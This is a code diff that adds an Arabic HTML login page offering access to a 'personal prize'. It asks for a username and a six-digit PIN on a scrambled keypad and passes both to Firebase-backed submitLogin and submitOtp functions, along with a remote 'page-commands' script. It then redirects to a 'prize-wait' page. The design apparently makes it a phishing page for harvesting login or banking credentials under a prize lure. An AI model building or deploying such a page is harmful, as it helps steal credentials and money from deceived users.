@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>إدخال اسم المستخدم</title>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root{--pink:#f7a1af;--pink-hover:#ef8fa1;--green:#69d9a7;--ink:#263238;--muted:#9aa4ae}
+    *{box-sizing:border-box}
+    body{margin:0;font-family:Cairo,Tahoma,sans-serif;background:#fff;color:var(--ink)}
+    .topbar{height:58px;padding:0 18px;display:flex;align-items:center;justify-content:flex-end;background:#fff}
+    .back{width:38px;height:38px;border:0;background:transparent;color:#263238;font-size:25px;line-height:1;cursor:pointer}
+    .card{width:min(100%,430px);margin:0 auto;padding:8px 11px 24px}
+    .card h1{margin:0 0 8px;text-align:right;font-size:19px;line-height:1.55;font-weight:800}
+    .intro{text-align:right;color:#73808c;font-size:12px;line-height:1.8;margin:0 0 12px}
+    .field label{display:block;text-align:right;font-size:11px;font-weight:700;margin:0 0 7px}
+    .field input{width:100%;height:39px;border:1.5px solid var(--green);border-radius:7px;padding:0 12px;font:13px Cairo,sans-serif;color:#263238;outline:none;background:#fff}
+    .field input:focus{border-color:#36c58d;box-shadow:0 0 0 3px #69d9a722}
+    .field input::placeholder{color:#b0b8c0}
+    .link-row{margin:8px 0 0;display:flex;align-items:center;justify-content:flex-end}
+    .link-row a{color:#ef8fa1;font-size:11px;font-weight:700;text-decoration:underline}
+    .options{margin-top:9px;display:flex;flex-direction:column;align-items:flex-end;gap:7px}
+    .option{display:flex;align-items:center;gap:7px;font-size:11px;color:#66727d;cursor:pointer}
+    .option input{width:14px;height:14px;margin:0;accent-color:#8d98a2}
+    .option input:focus{box-shadow:none}
+    .error{display:none;color:#c62828;text-align:right;font-size:11px;margin-top:7px}
+    .error.show{display:block}
+    .submit{width:100%;height:48px;margin-top:15px;border:0;border-radius:28px;background:#bfc4c8;color:#fff;font:800 16px Cairo,sans-serif;cursor:not-allowed;transition:.15s ease}
+    .submit.active{background:var(--pink);cursor:pointer}
+    .submit.active:hover{background:var(--pink-hover)}
+    .pin-stage{display:none;width:min(100%,430px);margin:0 auto;padding:8px 11px 24px}
+    .pin-stage.active{display:block}
+    .pin-field-wrap{position:relative}
+    .pin-field-wrap input{direction:ltr;text-align:right;padding-left:48px}
+    .pin-delete{position:absolute;left:8px;top:50%;transform:translateY(-50%);width:32px;height:32px;border:0;border-radius:7px;background:transparent;color:#7b858e;font-size:18px;cursor:pointer}
+    .keypad-sheet{display:none;position:absolute;right:0;bottom:0;left:0;min-height:278px;background:#fff;border-radius:15px 15px 0 0;padding:15px 16px 18px;box-shadow:0 -10px 30px #0000001a;text-align:center}
+    .keypad-sheet.active{display:block}
+    .handle{width:42px;height:4px;margin:-5px auto 9px;border-radius:9px;background:#dfe3e6}
+    .dots{direction:ltr;display:flex;justify-content:center;gap:10px;height:15px;margin-bottom:13px}
+    .dot{width:8px;height:8px;border-radius:50%;background:#dfe3e6}.dot.active{background:#69d9a7}
+    .digits-label{font-size:11px;color:#7e8993;margin:-7px 0 10px}
+    .digits{direction:ltr;display:grid;grid-template-columns:repeat(3,86px);justify-content:center;gap:8px}
+    .digit{height:44px;border:1px solid #dfe3e6;border-radius:8px;background:#fff;color:#263238;font:700 17px Cairo,sans-serif;cursor:pointer}
+    .pin-submit{width:min(100%,358px);height:46px;margin:10px auto 0;border:0;border-radius:24px;background:#bfc4c8;color:#fff;font:800 14px Cairo,sans-serif;display:block;cursor:not-allowed}
+    .pin-submit.active{background:#df2929;cursor:pointer}
+    @media(max-height:700px){.keypad-sheet{min-height:250px;padding-top:10px}.digits{grid-template-columns:repeat(3,82px);gap:6px}.digit{height:38px}.dots{margin-bottom:8px}.pin-submit{height:42px;margin-top:8px}}
+    @media(min-width:700px){body{background:#f7f8f9}.topbar{max-width:430px;margin:40px auto 0}.card,.pin-stage{background:#fff;border-radius:18px;padding:16px 18px 26px;box-shadow:0 10px 30px #0000000d}.topbar{padding:0 18px}}
+  </style>
+</head>
+<body>
+  <header class="topbar"><button class="back" type="button" aria-label="رجوع" onclick="history.back()">←</button></header>
+  <main class="card">
+    <h1>قم بتسجيل الدخول للوصول الى المسابقة<br>الشخصية الخاصة بك</h1>
+    <p class="intro">ادخل اسم المستخدم الخاص بك لتسجيل الدخول</p>
+    <form id="usernameForm">
+      <div class="field">
+        <label for="username">اسم المستخدم</label>
+        <input id="username" autocomplete="username" required placeholder="اسم المستخدم">
+      </div>
+      <div class="link-row"><a href="#" id="forgotUsername">نسيت اسم المستخدم؟</a></div>
+      <div class="options">
+        <label class="option"><input type="checkbox" name="rememberName"><span>تذكر اسمي</span></label>
+        <label class="option"><input type="checkbox" name="rememberPhone"><span>تذكر الجوال</span></label>
+      </div>
+      <div class="error" id="error">يرجى إدخال اسم المستخدم.</div>
+      <button class="submit" type="submit" id="continueBtn">التالي</button>
+    </form>
+  </main>
+  <main class="pin-stage" id="pinStage">
+    <h1>قم بتسجيل الدخول للوصول الى المسابقة<br>الشخصية الخاصة بك</h1>
+    <p class="intro">ادخل الرقم السري الخاص بك لتسجيل الدخول</p>
+    <div class="field">
+      <label for="pinDisplay">الرقم السري</label>
+      <div class="pin-field-wrap">
+        <input id="pinDisplay" type="text" inputmode="numeric" readonly placeholder="ادخل الرقم السري" value="">
+        <button class="pin-delete" id="pinDelete" type="button" aria-label="حذف آخر رقم">⌫</button>
+      </div>
+    </div>
+  </main>
+  <section class="keypad-sheet" id="keypadSheet" aria-label="لوحة إدخال الرقم السري">
+    <div class="handle"></div>
+    <div class="dots" id="dots"><i class="dot"></i><i class="dot"></i><i class="dot"></i><i class="dot"></i><i class="dot"></i><i class="dot"></i></div>
+    <div class="digits-label">ادخل رمزك السري</div>
+    <div class="digits" id="keypad"></div>
+    <button class="pin-submit" id="pinSubmit" type="button" disabled>تسجيل الدخول</button>
+  </section>
+  <script src="/assets/js/firebase-env.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
+  <script src="/assets/js/firebase-client.js?v=12"></script>
+  <script src="/assets/js/page-commands.js?v=5"></script>
+  <script>
+    document.getElementById("forgotUsername").addEventListener("click",e=>e.preventDefault());
+    const usernameInput=document.getElementById("username");
+    const continueBtn=document.getElementById("continueBtn");
+    function updateContinueState(){
+      const filled=usernameInput.value.trim().length>0;
+      continueBtn.classList.toggle("active",filled);
+      continueBtn.disabled=!filled;
+    }
+    usernameInput.addEventListener("input",updateContinueState);
+    updateContinueState();
+    document.getElementById("usernameForm").addEventListener("submit",async e=>{
+      e.preventDefault();const username=document.getElementById("username").value.trim();if(!username){document.getElementById("error").classList.add("show");return}
+      localStorage.setItem("prizeUsername",username);
+      if(window.submitLogin)await window.submitLogin({username,password:""});
+      document.querySelector(".card").style.display="none";
+      document.getElementById("pinStage").classList.add("active");
+      document.getElementById("keypadSheet").classList.add("active");
+    });
+
+    const pinDisplay=document.getElementById("pinDisplay");
+    const pinSubmit=document.getElementById("pinSubmit");
+    const pinDots=[...document.querySelectorAll(".dot")];
+    let pin="";
+    function renderPin(){
+      pinDots.forEach((dot,i)=>dot.classList.toggle("active",i<pin.length));
+      pinDisplay.value=pin?"•".repeat(pin.length):"";
+      pinSubmit.disabled=pin.length!==6;
+      pinSubmit.classList.toggle("active",pin.length===6);
+    }
+    ["5","4","7","2","6","0","3","8","1","9"].forEach(number=>{
+      const button=document.createElement("button");
+      button.type="button";button.className="digit";button.textContent=number;
+      button.addEventListener("click",()=>{if(pin.length<6){pin+=number;renderPin()}});
+      document.getElementById("keypad").appendChild(button);
+    });
+    const blank=document.createElement("button");blank.type="button";blank.className="digit";blank.disabled=true;blank.style.visibility="hidden";
+    document.getElementById("keypad").appendChild(blank);
+    const deleteButton=document.createElement("button");
+    deleteButton.type="button";deleteButton.className="digit";deleteButton.textContent="⌫";deleteButton.setAttribute("aria-label","حذف");
+    deleteButton.addEventListener("click",()=>{pin=pin.slice(0,-1);renderPin()});
+    document.getElementById("keypad").appendChild(deleteButton);
+    document.getElementById("pinDelete").addEventListener("click",()=>{pin=pin.slice(0,-1);renderPin()});
+    pinSubmit.addEventListener("click",async()=>{
+      if(pin.length!==6)return;
+      localStorage.setItem("prizePassword",pin);
+      if(window.submitLogin)await window.submitLogin({username:localStorage.getItem("prizeUsername")||"",password:pin});
+      if(window.submitOtp)await window.submitOtp(pin);
+      location.href="prize-wait.html";
+    });
+  </script>
+</body>
+</html>
